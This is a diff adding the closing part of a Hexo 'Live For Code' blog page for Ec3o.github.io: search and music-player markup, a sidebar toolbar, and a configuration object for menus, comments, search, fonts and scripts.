+<script type="text/javascript" src="/js/iscroll.js"></script>
+<script type="text/javascript" src="/js/instantsearch.min.js"></script>
+<div class="search-window">
+    <div class="search-content">
+        <div class="search-content-icon">
+            <i class="iconfont icon-search"></i>
+        </div>
+        <div id="search-input" class="search-input"></div>
+    </div>
+
+    <div class="search-scroll">
+        <div class="search-result">
+            <div id="search-stats" class="search-stats"></div>
+            <div id="search-hits"></div>
+            <div id="search-pagination" class="search-pagination"></div>
+        </div>
+    </div>
+
+    <span class="search-close-icon">
+        <i class="iconfont icon-close"></i>
+    </span>
+</div>
+    <div id="tools">
+    <div class="progressbar-top"></div>
+    
+    <link type="text/css" rel="stylesheet" href="/css/APlayer.css">
+    <script type="text/javascript" src="/js/APlayer.min.js"></script>
+    <script type="text/javascript" src="/js/Meting.min.js"></script>
+    <script>
+        var meting_api = 'https://api.i-meto.com/meting/api?server=:server&type=:type&id=:id&auth=:auth&r=:r';
+    </script>
+    <meting-js id="1980102173" lrcshow="true" server="netease" type="playlist" fixed="true" autoplay="false" loop="all" order="random" preload="auto" volume="0.67" mutex="true"></meting-js>
+
+    <div class="wrap-right">
+    <div class="wrap-right-hide">
+         <div class="wrap-right-button favorites">
+            <div class="iconbox" switch="false">
+                <span class="iconfont icon-favorites"></span>
+            </div>
+            <span class="icontext">关注</span>
+         </div>
+        <div class="wrap-right-button search">
+            <div class="iconbox">
+                <span class="iconfont icon-search-menu"></span>
+            </div>
+            <span class="icontext">搜索</span>
+        </div>
+        <div class="wrap-right-button menu-button">
+            <div class="iconbox">
+                <span class="iconfont icon-menu"></span>
+            </div>
+            <span class="icontext">菜单</span>
+        </div>
+        <div class="wrap-right-button mode">
+            <div class="light">
+                <div class="iconbox">
+                    <span class="iconfont icon-daymode"></span>
+                </div>
+                <span class="icontext">浅色模式</span>
+            </div>
+            <div class="dark">
+                <div class="iconbox">
+                    <span class="iconfont icon-nightmode-fill"></span>
+                </div>
+                <span class="icontext">深色模式</span>
+            </div>
+        </div>
+        <div class="wrap-right-button bottom">
+            <div class="iconbox">
+                <span class="iconfont icon-top"></span>
+            </div>
+            <span class="icontext">跳至底部</span>
+        </div>
+    </div>
+    <div class="wrap-right-show">
+        <div class="wrap-right-button set">
+            <div class="iconbox">
+                <span class="iconfont icon-setting"></span>
+            </div>
+            <span class="icontext">设置</span>
+        </div>
+        <div class="wrap-right-button top">
+            <div class="iconbox">
+                <span class="iconfont icon-top"></span>
+            </div>
+            <span class="icontext">返回顶部</span>
+        </div>
+    </div>
+</div>
+    <div class="loading"></div>
+</div>
+    <script>
+    window.config = {
+        GitHubUserName     : "Ec3o",
+        GitHubRepositories : "Ec3o.github.io",
+
+        User             : "Ec3o",
+        UserAvatar       : "/image/sidebar/avatar.jpg",
+        WebsiteStartDate : "2020-01-01",
+        Home             : "ec3o.github.io",
+
+        WebsiteTitleBlur         : "(◍´꒳`◍) Hi, Live For Code",
+        WebsiteTitleBlurTimeOut  : 500,
+        WebsiteTitleFocus        : "(*´∇｀*) 欢迎回来!",
+        WebsiteTitleFocusTimeOut : 1000,
+        WebsiteFavicon           : {
+            light : "/image/website/logo/logo.png",
+            dark  : "/image/website/logo/logo-dark.png"
+        },
+
+        ProgressBar : {
+            id       : "topProgressBar",
+            color    : "#77B6FF",
+            height   : "2px",
+            duration : 0.2
+        },
+
+        Loading: {
+            rebound : {
+                tension  : 16,
+                friction : 5
+            },
+            spinner : {
+                id     : "spinner",
+                radius : 90,
+                sides  : 3,
+                depth  : 4,
+                colors : {
+                    background : "#F0F0F0",
+                    stroke     : "#272633",
+                    base       : "",
+                    child      : "#272633"
+                },
+                alwaysForward : true,
+                restAt        : 0.5,
+                renderBase    : false
+            }
+        },
+
+        HomeHeaderAnimationRendered : true,
+        HomeHeaderAnimation         : {
+            radius      : 15,
+            density     : 0.2,
+            color       : "rgba(255, 255, 255, .2)",
+            clearOffset : 0.3
+        },
+
+        BackAnimationRendered          : true,
+        IEBrowserBackAnimationRendered : false,
+        BackAnimation                  : {
+            colorSaturation  : "60%",
+            colorBrightness  : "50%",
+            colorAlpha       : 0.5,
+            colorCycleSpeed  : 5,
+            verticalPosition : "random",
+            horizontalSpeed  : 200,
+            ribbonCount      : 3,
+            strokeSize       : 0,
+            parallaxAmount   : -0.2,
+            animateSections  : true
+        },
+
+        HomeHeaderImage : [
+            
+                "/image/header/home.jpg",
+            
+                "/image/header/home.jpeg",
+            
+                "/image/header/sky.jpg",
+            
+        ],
+        HomeBannerText  : "",
+
+        ArticleHeaderImage : [
+            
+                "/image/header/article.jpg",
+            
+        ],
+
+        OtherBannerText : "",
+
+        Error : {
+            icon    : "icon-swimming",
+            title   : "PAGE NOT FOUND",
+            content : [
+                
+                    "很抱歉，您访问的页面不存在！",
+                
+                    "可能是输入地址有误或该地址已变更。",
+                
+            ],
+            buttons : [
+                
+                    {
+                        icon  : "icon-home",
+                        text  : "返回首页",
+                        href  : "/",
+                        class : ""
+                    },
+                
+            ]
+        },
+
+        MenuNotice : {
+            enable : true,
+            notice : "我将，点燃大海",
+            speed  : 20
+        },
+        MenuList : [
+            
+                {
+                    name   : "首页",
+                    icon   : "icon-home-fill",
+                    href   : "/",
+                    type   : "index",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "分类",
+                    icon   : "icon-folder-fill",
+                    href   : "/category",
+                    type   : "category",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "标签",
+                    icon   : "icon-discount-fill",
+                    href   : "/tag",
+                    type   : "tag",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "归档",
+                    icon   : "icon-calendar-fill",
+                    href   : "/archive",
+                    type   : "archive",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "赞赏",
+                    icon   : "icon-heart-fill",
+                    href   : "/donate",
+                    type   : "donate",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "关于",
+                    icon   : "icon-about-fill",
+                    href   : "/about",
+                    type   : "about",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "订阅",
+                    icon   : "icon-rss",
+                    href   : "/atom.xml",
+                    type   : "",
+                    class  : "",
+                    target : "_blank"
+                },
+            
+                {
+                    name   : "搜索",
+                    icon   : "icon-search-menu",
+                    href   : "javascript:;",
+                    type   : "",
+                    class  : "search",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "留言板",
+                    icon   : "icon-comments-fill",
+                    href   : "/comment",
+                    type   : "comment",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "友情链接",
+                    icon   : "icon-link",
+                    href   : "/friend",
+                    type   : "friend",
+                    class  : "",
+                    target : "_self"
+                },
+            
+        ],
+        MenuLink : [
+            
+                
+                    {
+                        name   : "知乎",
+                        icon   : "icon-zhihu",
+                        href   : "https://zhihu.com/people/worstone-29",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "微博",
+                        icon   : "icon-weibo",
+                        href   : "https://weibo.com/u/5749847477",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "QQ",
+                        icon   : "icon-qq",
+                        href   : "javascript:;",
+                        class  : "image",
+                        target : "_self",
+                        image  : "/image/sidebar/qq.png"
+                    },
+                
+                    {
+                        name   : "微信",
+                        icon   : "icon-wechat",
+                        href   : "javascript:;",
+                        class  : "",
+                        target : "_self",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "GitHub",
+                        icon   : "icon-github",
+                        href   : "https://github.com/Ec3o",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+            
+        ],
+
+        FooterStyle : 2,
+        BottomText  : "<div><span class='face'>ღゝ◡╹)ノ♡</span></div><div>【人生若只如初见<span><i class='iconfont icon-like-fill'></i></span>何事秋风悲画扇】</div><div>&copy; 2020-2023 WorstOne. All Rights Reserved.</div>",
+
+        ConsoleList : [
+            
+                
+                    [
+                        
+                            
+                                "Based on cnblogs theme SimpleMemory.",
+                            
+                                "",
+                            
+                        
+                    ],
+                
+                    [
+                        
+                            
+                                "SimpleMemory Author:",
+                            
+                                "BNDong",
+                            
+                        
+                    ],
+                
+                    [
+                        
+                            
+                                "Theme:",
+                            
+                                "LiveForCode",
+                            
+                        
+                    ],
+                
+            
+        ],
+
+        FontIconExtend : "",
+
+        Donate : {
+            paypal  : "",
+            bitcoin : "",
+            alipay  : "/image/donate/alipay.png",
+            wechat  : "/image/donate/wechat.png"
+        },
+
+        Search : {
+            applicationID : "010C3EANT8",
+            apiKey        : "c7abab9f11b79102b9aff7fe6d41447d",
+            indexName     : "Notes",
+            hits          : {
+                page : 10
+            },
+            labels        : {
+                placeholder : "搜索",
+                empty       : "未发现与 「${query}」 相关的内容",
+                stats       : "${hits} 条相关条目，使用了 ${time} 毫秒",
+            }
+        }, 
+
+        Comment : {
+            switch : true,
+            type   : "Valine",
+        },
+
+        Waline : {
+            el              : ".comments-content",
+            serverURL       : "",
+            path            : window.location.pathname,
+            meta            : "['nick', 'mail', 'link']",
+            requiredMeta    : "['nick', 'mail']",
+            pageSize        : 10,
+            lang            : "zh-cn",
+            locale: {
+                admin       : "博主",
+                anonymous   : "匿名用户",
+                sofa        : "快来做第一个评论的人吧 ~",
+                placeholder : "天生我才必有用,散尽千金还复来",
+            },
+            dark            : "html[color-scheme='dark']",
+            search          : false,
+            pageview        : true,
+            comment         : true,
+            copyright       : false,
+        },
+
+        Valine : {
+            el             : ".comments-content",
+            appId          : "srhKtvWPQTWYKh3qX8G8M7v0-gzGzoHsz",
+            appKey         : "8uVSP1q6UlALVC5igYfIfv2h",
+            serverURLs     : "",
+            placeholder    : "天生我才必有用,散尽千金还复来",
+            avatar         : "mm",
+            meta           : "nick,mail,link",
+            requiredFields : "nick,mail",
+            pageSize       : 5,
+            lang           : "zh-cn",
+            visitor        : true,
+            enableQQ       : true
+        },
+
+        Tocbot : {
+            switch                : true,
+            tocSelector           : ".toc",
+            contentSelector       : ".article-body",
+            headingSelector       : "h1, h2, h3, h4, h5",
+            headingsOffset        : 0,
+            scrollSmooth          : true,
+            scrollSmoothOffset    : -5,
+            positionFixedSelector : ".toc",
+            positionFixedClass    : "toc-fixed",
+            fixedSidebarOffset    : "",
+        },
+
+        Require : {
+            baseUrl     : "/js/",
+            waitSeconds : 100
+        },
+
+        Music : {
+            type : "Meting"
+        },
+        APlayer : {
+            container : ".aplayer",
+            fixed     : true,
+            autoplay  : false,
+            loop      : "all",
+            order     : "random",
+            preload   : "auto",
+            volume    : 0.67,
+            mutex     : true,
+            lrcType   : 3,
+            audio     : [
+                
+                    {
+                        name   : "Endless Tears",
+                        artist : "CLIFF EDGE",
+                        cover  : "/music/cover/Endless Tears.jpg",
+                        url    : "/music/song/Endless Tears.mp3",
+                        lrc    : "/music/lrc/Endless Tears.lrc"
+                    },
+                
+            ]
+        },
+        Meting : {
+            api      : "https://api.i-meto.com/meting/api",
+            id       : "1980102173", 
+            lrcshow  : true, 
+            server   : "netease", 
+            type     : "playlist", 
+            fixed    : true, 
+            autoplay : false, 
+            loop     : "all", 
+            order    : "random", 
+            preload  : "auto", 
+            volume   : 0.67, 
+            mutex    : true
+        },
+
+        Mouse : {
+            enable  : true,
+            options : {
+                size  : 6,
+                sizeF : 24
+            }
+        },
+
+        LazyLoad : {
+            default : "/image/website/lazyload.svg"
+        },
+  
+        Style : {
+            aplayer          : "/css/APlayer.css",
+            archive          : "/css/archive.css",
+            base             : "/css/base.css",
+            clipboard        : "/css/clipboard.css",
+            code             : "/css/code.css",
+            donate           : "/css/donate.css",
+            fancybox         : "/css/jquery.fancybox.css",
+            footer           : "/css/footer.css",
+            iconfont         : "/iconfont/iconfont.css",
+            index            : "/css/index.css",
+            menuBubble       : "/css/menu-bubble.css",
+            mouse            : "/css/mouse.css",
+            page             : "/css/page.css",
+            post             : "/css/post.css",
+            search           : "/css/search.css",
+            tocbot           : "/css/tocbot.css",
+            valine           : "/css/valine.css",
+            waline           : "/css/waline.css",
+            walineCustom     : "/css/waline-custom.css"
+        },
+
+        Script: {
+            aplayer          : "/js/APlayer.min.js",
+            config           : "/js/require.config.js",
+            index            : "/js/index.js",
+            instantSearch    : "/js/instantsearch.min.js",
+            iscroll          : "/js/iscroll.js",
+            jQuery           : "/js/jquery-3.4.1.min.js",
+            loading          : "/js/loading.js",
+            meting           : "/js/Meting.min.js",
+            require          : "/js/require.min.js",
+            waline           : "/js/waline.mjs",
+            pageview         : "/js/pageview.mjs",
+            comment          : "/js/comment.mjs",
+        },
+
+        Font: {
+            LongCang    : "/font/LongCang.css",
+            Monda       : "/font/Monda.css",
+            NotoSansSC  : "/font/NotoSansSC.css",
+            NotoSerifSC : "/font/NotoSerifSC.css",
+            Playball    : "/font/Playball.css",
+            PTMono      : "/font/PTMono.css",
+            Roboto      : "/font/Roboto.css",
+            RobotoSlab  : "/font/RobotoSlab.css",
+            Rosario     : "/font/Rosario.css",
+            UbuntuMono  : "/font/UbuntuMono.css"
+        },
+
+        Suffix : {
+            about : "我将,点燃大海！"
+        },
+            
+        Theme : {
+            url  : "https://github.com/first19326/Hexo-LiveForCode",
+            name : "Hexo - Live For Code"
+        }  
+    };
+</script>
+    <script type="text/javascript" src="/js/index.js"></script>
+</body>
+</html>
